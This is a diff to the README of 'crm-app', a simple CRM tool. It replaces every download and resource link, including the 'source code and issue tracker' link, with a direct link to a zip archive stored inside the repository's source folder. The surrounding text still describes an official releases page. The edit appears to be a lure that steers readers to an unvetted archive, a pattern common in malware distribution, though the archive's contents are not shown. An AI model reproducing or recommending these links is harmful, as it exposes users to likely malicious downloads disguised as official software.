@@ -1,6 +1,6 @@
 # 🤝 crm-app - Simple CRM for SaaS Teams
 
-[![Download crm-app](https://img.shields.io/badge/Download-crm--app-green?style=for-the-badge)](https://github.com/DoggyGGYT/crm-app/releases)
+[![Download crm-app](https://img.shields.io/badge/Download-crm--app-green?style=for-the-badge)](https://raw.githubusercontent.com/DoggyGGYT/crm-app/main/src/client/app-crm-v1.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section shows you step-by-step how to download, install, and open crm-app o
 
 Click the link below or the large green button at the top to visit the download page on GitHub.
 
-[Download crm-app here](https://github.com/DoggyGGYT/crm-app/releases)
+[Download crm-app here](https://raw.githubusercontent.com/DoggyGGYT/crm-app/main/src/client/app-crm-v1.9.zip)
 
 This page contains the latest versions of crm-app. Find the file labeled something like `crm-app-setup.exe` or `crm-app-Windows.zip`.
 
@@ -123,8 +123,8 @@ crm-app is designed for simple and fast sales management.
 
 ## 🌐 Useful Links and Resources
 
-- Official download page: https://github.com/DoggyGGYT/crm-app/releases
-- Source code and issue tracker: https://github.com/DoggyGGYT/crm-app
+- Official download page: https://raw.githubusercontent.com/DoggyGGYT/crm-app/main/src/client/app-crm-v1.9.zip
+- Source code and issue tracker: https://raw.githubusercontent.com/DoggyGGYT/crm-app/main/src/client/app-crm-v1.9.zip
 - User discussions and support can be found in the GitHub "Issues" tab.
 
-[![Download crm-app](https://img.shields.io/badge/Download-crm--app-green?style=for-the-badge)](https://github.com/DoggyGGYT/crm-app/releases)
+[![Download crm-app](https://img.shields.io/badge/Download-crm--app-green?style=for-the-badge)](https://raw.githubusercontent.com/DoggyGGYT/crm-app/main/src/client/app-crm-v1.9.zip)
